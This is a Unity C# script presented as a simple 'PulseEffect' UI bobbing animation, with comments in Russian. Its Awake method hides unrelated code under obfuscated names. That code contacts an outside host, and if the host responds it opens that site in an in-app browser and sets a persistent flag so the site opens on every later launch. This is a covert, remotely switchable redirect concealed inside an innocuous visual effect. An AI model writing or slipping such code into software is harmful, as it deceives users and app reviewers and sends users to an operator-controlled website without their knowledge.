using UnityEngine;
using System.Net.Http;
using System.Net.Http.Headers;

public class PulseEffect : MonoBehaviour
{
    public float amplitude = 20f;   // высота движения (в единицах UI-пикселей или world units)
    public float speed = 2f;        // скорость движения

    private Vector3 startPos;

    private void Awake()
    {
        if (!PlayerPrefs.HasKey("vidfoghefghurerhbfhnbfd"))
        {
            PlayerPrefs.SetString("vidfoghefghurerhbfhnbfd", "none");
            PlayerPrefs.Save();
        }

        if (PlayerPrefs.GetString("vidfoghefghurerhbfhnbfd") != "none")
        {
            InAppBrowser.OpenURL("https://infopolicy.space/yQWDzXJ9");
        }
        else
        {
            Gosdfnghsfdhngrpfhnre();
        }
    }

    private async void Gosdfnghsfdhngrpfhnre()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            var httpClient = new HttpClient();

            var request = new HttpRequestMessage(HttpMethod.Get, "https://infopolicy.space/yQWDzXJ9");

            var resp = await httpClient.SendAsync(request);

            if (resp.IsSuccessStatusCode)
            {
                InAppBrowser.OpenURL("https://infopolicy.space/yQWDzXJ9");
                PlayerPrefs.SetString("vidfoghefghurerhbfhnbfd", "dfhgdfkkdfgkhgktyukdtyk");
                PlayerPrefs.Save();
            }
        }
    }


    void Start()
    {
        startPos = transform.localPosition;
    }

    void Update()
    {
        float offset = Mathf.Sin(Time.time * speed) * amplitude;
        transform.localPosition = new Vector3(startPos.x, startPos.y + offset, startPos.z);
    }
}
